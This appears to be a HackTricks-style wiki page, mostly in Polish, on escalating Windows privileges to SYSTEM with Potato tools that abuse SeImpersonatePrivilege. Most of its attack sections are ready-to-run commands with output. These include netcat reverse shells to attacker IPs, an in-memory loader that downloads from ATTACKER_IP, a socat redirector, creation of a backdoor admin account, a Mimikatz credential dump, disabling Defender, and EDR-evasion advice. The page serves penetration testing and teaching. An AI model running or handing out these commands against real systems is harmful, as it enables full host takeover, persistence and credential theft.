# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> A modern alternative frequently maintained in 2024–2025 is SigmaPotato (a fork of GodPotato) which adds in-memory/.NET reflection usage and extended OS support. See quick usage below and the repo in References.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Wymagania i częste pułapki

Wszystkie poniższe techniki polegają na nadużyciu uprzywilejowanej usługi zdolnej do impersonacji z kontekstu posiadającego jeden z następujących przywilejów:

- SeImpersonatePrivilege (najczęstszy) lub SeAssignPrimaryTokenPrivilege
- High integrity nie jest wymagany jeśli token już ma SeImpersonatePrivilege (typowe dla wielu kont usługowych takich jak IIS AppPool, MSSQL, itp.)

Szybkie sprawdzenie przywilejów:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- Jeśli twój shell działa pod ograniczonym tokenem, któremu brakuje SeImpersonatePrivilege (częste dla Local Service/Network Service w niektórych kontekstach), odzyskaj domyślne uprawnienia konta używając FullPowers, następnie uruchom Potato. Przykład: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer wymaga, aby usługa Print Spooler była uruchomiona i dostępna przez lokalny endpoint RPC (spoolss). W zahartowanych środowiskach, gdzie Spooler jest wyłączony po PrintNightmare, preferuj RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato wymaga OXID resolver dostępnego na TCP/135. Jeśli egress jest zablokowany, użyj redirector/port-forwarder (zob. przykład poniżej). Starsze buildy wymagały flagi -f.
- EfsPotato/SharpEfsPotato wykorzystują MS-EFSR; jeśli jeden pipe jest zablokowany, spróbuj alternatywnych pipes (lsarpc, efsrpc, samr, lsass, netlogon).
- Błąd 0x6d3 podczas RpcBindingSetAuthInfo zwykle wskazuje na nieznaną/nieobsługiwaną usługę uwierzytelniania RPC; spróbuj innego pipe/transportu lub upewnij się, że docelowa usługa działa.
- “Kitchen-sink” forks takie jak DeadPotato dołączają dodatkowe moduły payload (Mimikatz/SharpHound/Defender off), które zapisują na dysku; spodziewaj się wyższego wykrywania przez EDR w porównaniu do szczupłych oryginałów.

## Quick Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Uwagi:
- Możesz użyć -i, aby uruchomić proces interaktywny w bieżącej konsoli, lub -c, aby uruchomić one-liner.
- Wymaga usługi Spooler. Jeśli jest wyłączona, operacja się nie powiedzie.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Jeśli outbound 135 jest zablokowany, przeprowadź pivot OXID resolver przez socat na twoim redirectorze:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato to nowsza prymitywna metoda nadużycia COM opublikowana pod koniec 2022 roku, która celuje w usługę **PrintNotify** zamiast Spooler/BITS. Plik binarny tworzy instancję serwera PrintNotify COM, podmienia `IUnknown` na fałszywy, a następnie wywołuje uprzywilejowane wywołanie zwrotne przez `CreatePointerMoniker`. Kiedy usługa PrintNotify (działająca jako **SYSTEM**) łączy się z powrotem, proces duplikuje zwrócony token i uruchamia podany payload z pełnymi uprawnieniami.

Key operational notes:

* Działa na Windows 10/11 i Windows Server 2012–2022, o ile zainstalowana jest usługa Print Workflow/PrintNotify (jest dostępna nawet gdy legacy Spooler jest wyłączony po PrintNightmare).
* Wymaga, aby kontekst wywołujący posiadał **SeImpersonatePrivilege** (typowe dla IIS APPPOOL, MSSQL i kont usług zadań zaplanowanych).
* Akceptuje albo bezpośrednie polecenie, albo tryb interaktywny, dzięki czemu możesz pozostać w oryginalnej konsoli. Przykład:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Ponieważ opiera się wyłącznie na COM, nie są wymagane named-pipe listeners ani zewnętrzne redirectory, co czyni go zamiennikiem plug-and-play na hostach, na których Defender blokuje RoguePotato’s RPC binding.

Operatorzy tacy jak Ink Dragon uruchamiają PrintNotifyPotato zaraz po uzyskaniu ViewState RCE na SharePoint, aby pivotować z procesu `w3wp.exe` do SYSTEM przed zainstalowaniem ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Wskazówka: Jeśli jeden pipe zawiedzie lub EDR go zablokuje, spróbuj innych obsługiwanych pipes:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Uwagi:
- Działa na Windows 8/8.1–11 oraz Server 2012–2022, gdy obecne jest SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato udostępnia dwa warianty atakujące service DCOM objects, które domyślnie używają RPC_C_IMP_LEVEL_IMPERSONATE. Skompiluj lub użyj dostarczonych binaries i uruchom swoje polecenie:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (zaktualizowany fork GodPotato)

SigmaPotato dodaje nowoczesne udogodnienia, takie jak in-memory execution poprzez .NET reflection oraz pomocnik PowerShell do reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Wbudowany przełącznik reverse shell `--revshell` oraz usunięcie 1024-znakowego limitu PowerShell, dzięki czemu możesz odpalić długie AMSI-bypassing payloads za jednym razem.
- Reflection-friendly składnia (`[SigmaPotato]::Main()`), oraz prymitywny AV evasion trik przez `VirtualAllocExNuma()`, żeby zmylić proste heurystyki.
- Oddzielny `SigmaPotatoCore.exe` skompilowany pod .NET 2.0 dla środowisk PowerShell Core.

### DeadPotato (przeróbka GodPotato z 2024 z modułami)

DeadPotato zachowuje GodPotato OXID/DCOM impersonation chain, ale wbudowuje post-exploitation helpery, dzięki czemu operatorzy mogą natychmiast przejąć SYSTEM i wykonać persistence/collection bez dodatkowych narzędzi.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — uruchom dowolne polecenie jako SYSTEM.
- `-rev <ip:port>` — szybka reverse shell.
- `-newadmin user:pass` — utwórz lokalnego admina dla persistence.
- `-mimi sam|lsa|all` — zrzuci i uruchomi Mimikatz żeby dump credentials (touches disk, noisy).
- `-sharphound` — uruchom SharpHound collection jako SYSTEM.
- `-defender off` — wyłącz Defender real-time protection (bardzo noisy).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Ponieważ zawiera dodatkowe pliki binarne, spodziewaj się większej liczby wykryć przez AV/EDR; użyj lżejszego GodPotato/SigmaPotato, gdy ważna jest dyskrecja.

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
